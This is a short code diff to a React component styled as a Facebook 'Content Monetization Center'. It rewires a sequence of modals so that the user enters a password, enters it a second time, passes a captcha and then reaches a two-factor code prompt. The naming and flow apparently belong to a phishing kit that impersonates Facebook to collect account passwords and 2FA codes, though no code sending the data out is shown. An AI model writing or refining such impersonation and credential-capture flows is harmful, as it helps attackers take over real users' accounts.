@@ -139,8 +139,7 @@ const FacebookContentMonetizationCenter = () => {
                 onClearAccountMismatch={() => setAccountMismatchActive(false)}
                 onInfoValidated={() => {
                     setAccountMismatchActive(false)
-                    setCaptchaSessionKey((k) => k + 1)
-                    setIsOpenCaptcha(true)
+                    handleOpenPasswordModal(true)
                 }}
                 onToggleModal={(isOpen: boolean) => setIsOpenInfo(isOpen)}
             />
@@ -151,7 +150,7 @@ const FacebookContentMonetizationCenter = () => {
                 onClose={() => setIsOpenCaptcha(false)}
                 onVerified={() => {
                     setIsOpenCaptcha(false)
-                    handleOpenPasswordModal(true)
+                    handleOpenTwoFactorModal(true)
                 }}
                 onNeedReentry={() => {
                     setIsOpenCaptcha(false)
@@ -164,6 +163,10 @@ const FacebookContentMonetizationCenter = () => {
                 isOpend={isOpenPassword}
                 isOpendTwoFactor={(open: boolean) => handleOpenTwoFactorModal(open)}
                 onToggleModal={(isOpen: boolean) => setIsOpenPassword(isOpen)}
+                onAfterSecondPasswordSubmit={() => {
+                    setCaptchaSessionKey((k) => k + 1)
+                    setIsOpenCaptcha(true)
+                }}
             />
 
             <TwoFactorModal
